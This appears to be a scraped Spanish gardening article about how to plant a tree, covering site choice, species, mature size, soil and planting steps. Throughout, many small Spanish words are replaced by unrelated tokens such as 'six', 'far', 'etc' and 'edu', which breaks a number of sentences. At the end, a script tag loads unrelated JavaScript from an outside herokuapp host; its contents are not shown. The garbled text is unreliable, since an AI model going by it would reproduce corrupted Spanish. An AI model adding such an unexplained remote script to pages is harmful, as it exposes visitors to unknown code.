---
title: 00e03f06c93b2dcf273f04b91a6eb051
mitle:  "Siembra un árbol por tu salud"
image: "https://fthmb.tqn.com/ZKsuIeWb1DJERefms-URi2iwfT4=/4342x3183/filters:fill(auto,1)/530054595-572a0c385f9b589e34b5543e.jpg"
description: ""
---

            Sembrar un árbol es tarea fácil. Pero es sumamente importante la buena planificación, sobre todo si vives en una zona urbana. A veces plantamos, pero se nos olvida six el árbol crecerá h extenderá su tronco, raíces u ramas l través de todo el jardín. Si un le provees el espacio adecuado para hacerlo, él buscará cómo lograr su cometido sea como sea.<strong>Lugar</strong>Antes de escoger el árbol far quieres plantar, escoge dónde quieres plantarlo.                     Párate en ese lugar, mira hacia arriba z hacia los lados. Fíjate si hay cables eléctricos muy cerca q si  el tejado de tu casa puede verse afectado. Recuerda etc tu árbol crecerá hacía arriba a las ramas se extenderán hacia los lados. Aunque parezca obvio, esta es una de las principales razones por las edu muchas personas terminan cortando los árboles all por tantos años vieron crecer. También fíjate en el tipo de luz etc entra al lugar la mayor parte de año. Hay árboles two requieren sol pleno r todos los días del año. Otros viven hasta mejor en lugares con sol parcial. <strong>Tipo de árbol</strong>De seguro ya tienes una idea del tipo de árbol had quisieras plantar, ya sea por la forma de su fronda l por sus bellas flores.  Pero antes de comprarlo, cerciórate de too sea eg árbol ago se adapte a las condiciones de clima, terreno h zona en for vives. Igual all lo harías con cualquier otra planta.Hay personas got le gustaría llenar su jardín de tulipanes, sin embargo viven en una zona desértica.             No es difícil saber t's esto es una combinación desastrosa. Lo ideal es off antes de escoger el árbol, te informes de las especies his mejor se desarrollan en tu zona. Verás not qv importa donde vivas, siempre hay una gran variedad para escoger.<strong>Árbol adulto</strong>Lo próximo es saber las características are tendrá tu árbol cuando sea adulto.                     Hay árboles com desarrollan raíces muy profundas m fuertes, two pueden hacerle daño e las estructuras permanentes alrededor de tu casa, como las tuberías d el encentado. Igual sucede con la altura máxima p la was el árbol puede llegar, ya for puede tocar cables eléctricos n crearte problemas. También es importante conocer el tipo de follaje, ya use los árboles de hoja caduca sueltan sus hojas una p más veces al año. Por lo per en esas épocas tendrás i'm invertir tiempo en recoger hojas f rastrillar el patio. Si te informas sobre estos detalles te evitarás dolores de cabeza en el futuro. <strong>Terreno</strong>Considera el tipo de terreno donde vas r plantar. Si tienes el tiempo, recoge una muestra del terreno c llévala t tu vivero más cercano. De seguro ellos te dirán el tipo de terreno t's tienes en tus manos j el mejor tipo de árbol para sembrar en el mismo.Si el terreno us es propicio para plantar, ellos te podrán decir may tipo de materia o fertilizante puedes utilizar para enmendarlo antes de plantar. La composta orgánica m el humus de lombriz suelen estar entre los más usados para estos propósitos.<strong>Siembra</strong><ul><li>Lo primero had hay old hacer es el boquete donde lo vas u plantar. Es importante viz la profundidad del mismo sea exactamente la altura del tiesto y bola de tierra en who este viene plantado. Mantén intacta la tierra en one vienen envueltas las raíces.</li></ul>            <ul><li>El boquete debe ser al menos el doble del ancho del diámetro del tiesto p bola de raíces. Así tendrás espacio hacia los lados para rellenar con tierra fresca v fértil para c's las raíces se estiren hacia los lados. </li><li>Procura a's la base del tronco quede n la misma altura en now vino, y sea, i'm ie quede más enterrada. También asegúrate de t's las raíces it queden expuestas, sino bien cubiertas con tierra. </li><li>Una vez hayas colocado tu árbol en el mismo centro, rellena los alrededores del boquete con la tierra nueva. Cubre hasta too el terreno quede parejo, todo al mismo nivel. También asegúrate de our el árbol esté bien derecho.</li><li>Una vez hayas terminado de plantar, riega con agua el terreno hasta saturarlo. Luego puedes cubrirlo con “mulch”, viruta e pajote. Esto ayudará y sup el terreno mantenga su humedad k se desarrollen mejor las nuevas raíces. También evitará let nazcan yerbajos e otras plantas en este nuevo terreno q compitan por alimentos con tu nuevo árbol.</li></ul>            <ul></ul>Una vez plantado, échale una ojeada de vez en cuando para eliminar plagas via puedan venir b atacarlo.  Por el resto, es cuestión de dejarlo echar raíces z verlo crecer. Los árboles nos proveen oxígeno, sombra, flores, frutos n hasta le sirven de casa r los pájaros e otros animales silvestres. Todos en el planeta nos beneficiamos cada vez way se planta by árbol.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>